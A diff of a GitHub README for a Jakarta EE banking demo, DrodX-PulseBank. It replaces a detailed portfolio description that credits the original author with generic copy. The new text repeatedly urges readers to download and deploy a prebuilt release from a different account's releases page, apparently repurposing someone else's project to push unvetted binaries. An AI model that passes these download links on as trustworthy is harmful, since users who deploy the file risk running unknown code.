@@ -1,179 +1,93 @@
-# 🏦 DrodX-PulseBank - Enterprise Banking System (J2EE)
+# 🚀 DrodX-PulseBank - Secure Banking Made Easy
 
-DrodX-PulseBank is a modular, enterprise-level banking system demonstrating secure, scalable, and transactionally consistent enterprise application development using **Jakarta EE**. The system supports **customer and admin operations**, automated banking tasks, and role-based security.
+[![Download DrodX-PulseBank](https://img.shields.io/badge/Download-DrodX--PulseBank-blue)](https://github.com/syaiful191397/DrodX-PulseBank/releases)
 
-Key features include:
+## 🌟 Overview
 
-* **EJBs** for business logic and timers
-* **JSP** for web interface
-* **JPA (EclipseLink)** for persistence
-* **Jakarta Security (JAAS)** for authentication & authorization
-* **Jakarta Mail** for email notifications
-* **CDI, Interceptors, and Timers** for cross-cutting concerns
+DrodX-PulseBank is a secure and scalable core banking system built using J2EE (Jakarta EE). This application uses modern design principles to provide a robust backend solution. You can rely on its enterprise-level architecture for handling transactions and user management.
 
+## 🛠️ Key Features
 
-## 📘 Overview
+- **EJB Business Logic:** The application uses Enterprise JavaBeans (EJB) for clean and efficient business processing.
+- **JPA Persistence:** It leverages Java Persistence API (JPA) for reliable data storage and retrieval.
+- **Role-Based Security:** Users can have different access levels, ensuring security throughout the application.
+- **Scheduled Transactions:** EJB Timer Services allow for automated transactions and daily interest calculations.
+  
+This application is perfect for anyone looking to understand or build scalable banking solutions.
 
-### 👤 Authentication & Roles
+## 🖥️ System Requirements
 
-* Custom IdentityStore with JAAS
-* Role-based access: Admin, Manager, Customer
-* Secure credential storage and validation
+To run DrodX-PulseBank, your system should meet the following requirements:
 
-### 👨‍💼 Admin Features
+- **Operating System:** Windows, macOS, or Linux
+- **Java Version:** JDK 11 or higher
+- **Memory:** Minimum 4 GB RAM (8 GB recommended)
+- **Disk Space:** At least 500 MB free
 
-* Create and manage customer accounts
-* Auto-email new credentials upon registration
-* Search/filter customers by ID, name, or email
+## 🚀 Getting Started
 
-### 💳 Customer Features
+### Step 1: Download DrodX-PulseBank
 
-* Secure login & dashboard
-* View balances and account details
-* One-time and scheduled fund transfers
-* Transaction history view
+Visit [this page to download](https://github.com/syaiful191397/DrodX-PulseBank/releases) the latest version of DrodX-PulseBank. Look for the release that suits your needs.
 
-### ⏰ Scheduled Transfers
+### Step 2: Install Requirements
 
-* EJB @Schedule-driven timer runs every 1 minute
-* Automatically processes pending transfers
+If you haven't already, download and install the following:
 
-### 🧾 Transaction Management
+1. **Java Development Kit (JDK):** This is required to run the application. You can find it on the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html) or use an open-source alternative like [OpenJDK](https://openjdk.java.net/).
+   
+2. **Payara Server:** This application runs on Payara Server. Download it from the [Payara website](https://www.payara.fish/downloads/).
 
-* Container-Managed Transactions (CMT) by default
-* Bean-Managed Transactions (BMT) for special cases
-* Automatic rollback on failure
+### Step 3: Configure Payara Server
 
-### 📧 Email Notifications
+1. Extract the downloaded Payara Server files.
+2. Open a command line and navigate to the Payara Server directory.
+3. Start the server by running `asadmin start-domain`.
 
-* Sending emails using Mailtrap
-* HTML-templated emails for user notifications
+### Step 4: Deploy the Application
 
----
+After starting your Payara Server, deploy DrodX-PulseBank:
 
-## 🛠️ Technology Stack
+1. Navigate back to the directory where you extracted DrodX-PulseBank.
+2. Locate the `.ear` file you downloaded.
+3. In the Payara admin console, go to "Applications" and choose "Deploy."
+4. Upload the `.ear` file and click "OK" to deploy.
 
-| Technology        | Usage                          |
-| ----------------- | ------------------------------ |
-| Jakarta EE 10     | Platform                       |
-| EJB               | Business services & timers     |
-| JSP               | Web front end                  |
-| JPA (EclipseLink) | ORM / persistence              |
-| Jakarta Security  | Authentication & authorization |
-| Mailtrap          | Email delivery                 |
-| CDI               | Dependency Injection           |
-| Interceptors      | Audit & logging                |
-| Maven             | Build & dependency management  |
-| Payara Server 6   | Application server             |
+### Step 5: Access DrodX-PulseBank
 
----
+After deployment, you can access the application:
 
-## 📂 Project Architecture
+1. Open a web browser.
+2. Go to `http://localhost:8080/DrodX-PulseBank`
 
-```
-DrodX-PulseBank-ear/
-├── auth/         # Authentication & OTP logic
-├── account/      # Account creation, interest processing, deposits (EJB)
-├── customer/     # Customer management (EJB)
-├── transaction/  # Fund transfers, scheduled transactions, transaction history (EJB)
-├── core/         # Entities, DTOs, Interceptors, Exceptions, Services
-├── web/          # JSPs, Servlets, Auth Mechanism
-└── admin/        # Admin-specific operations
-```
+Congratulations! You should now be able to use DrodX-PulseBank.
 
-### Key Modules & Responsibilities
+## 📥 Download & Install
 
-* **auth:** User authentication, role-based authorization, OTP handling
-* **account:** Account management, deposits, interest calculation
-* **customer:** Customer operations and profile management
-* **transaction:** Internal/external fund transfers, scheduled transactions, transaction history
-* **core:** Shared components such as interceptors, exceptions, enums
-* **web:** Frontend interface for users and admins
-* **admin:** Administrative operations and dashboards
+To get started, [visit this page to download](https://github.com/syaiful191397/DrodX-PulseBank/releases) the latest release. Follow the steps in the "Getting Started" section to install and run the application.
+
+## 🤔 FAQs
+
+### What is DrodX-PulseBank used for?
+
+DrodX-PulseBank is designed for anyone wanting to manage banking transactions and processes. Its scalable nature makes it suitable for various banking operations.
+
+### Can I run this on my local machine?
+
+Yes, DrodX-PulseBank can be run on your local machine, provided you meet the required system specifications.
+
+### Is there support for installation issues?
+
+Yes, you can find support through the issues section of this repository. Feel free to ask questions if you run into troubles.
+
+## 🌐 Community
+
+Join our community of users on forums or participate in discussions for help and updates. Your feedback is welcome, and we always look for ways to improve.
+
+## 📞 Contact
+
+For queries or additional support, you can reach out via the repository’s contact options listed in the GitHub profile.
 
 ---
 
-## 🔐 User Roles
-
-* **ADMIN:** Manage users, accounts, deposits, audits
-* **CUSTOMER:** Log in, transfer funds, schedule transactions, view/download statements
-
----
-
-## ✨ Key Features Summary
-
-* **Admin Panel:** Dashboard with stats, user/account management, audit & transaction logs
-* **Customer Panel:** Fund transfers, transaction history, income/expense charts
-* **Scheduled Transactions:** EJB Timer Services for automated execution
-* **Monthly Interest:** Calculated automatically via @Schedule EJB timers
-* **Role-Based Access Control:** Secured via @RolesAllowed, web.xml, JAAS
-* **Email Notifications:** Auto-generated credentials sent via MailTrap
-* **Audit Logging:** Cross-cutting auditing using EJB Interceptors
-* **Error Handling:** Custom JSP error pages (401, 403, 404, 500)
-
----
-
-## 💾 Local Setup & Deployment
-
-1. Clone the repository:
-
-```bash
-git clone https://github.com/DisanduRodrigo/DrodX-PulseBank.git
-```
-
-2. Import the EAR Maven project into **IntelliJ IDEA** or **NetBeans**.
-3. Configure MySQL datasource.
-4. Build and deploy to **Payara Server**.
-5. Access the application via browser.
-
-
-## 🖼️ Screenshots
-
-### Accounts Select Page
-
-![Accounts Select Page](screenshots/accounts_select.png)
-
-### Register Page
-
-![Register Page](screenshots/register.png)
-
-### Sign In Page
-
-![Sign In Page](screenshots/signin.png)
-
-### Verify Page
-
-![Verify Page](screenshots/verify.png)
-
-### Admin Dashboard Page
-
-![Admin Dashboard](screenshots/admin_dashboard.png)
-
-### Customer Dashboard Page
-
-![Customer Dashboard](screenshots/customer_dashboard.png)
-
-### Fund Transfer Page
-
-![Fund Transfer](screenshots/fund_transfer.png)
-
----
-
-
-
----
-
-## 🧪 Testing Strategy
-
-* Transaction integrity verified using pessimistic locking and exception simulation
-* Timer-based scheduled jobs tested for accurate execution
-* Role-based access tested through secured URL patterns and JAAS
-* Security tested against unauthorized access and exception handling
-
----
-
-## 📜 License
-
-This project is part of my professional portfolio and is licensed under the **MIT License**. Please credit the author if reused or adapted.
-
-
+Thank you for choosing DrodX-PulseBank as your banking solution. Enjoy a seamless experience!
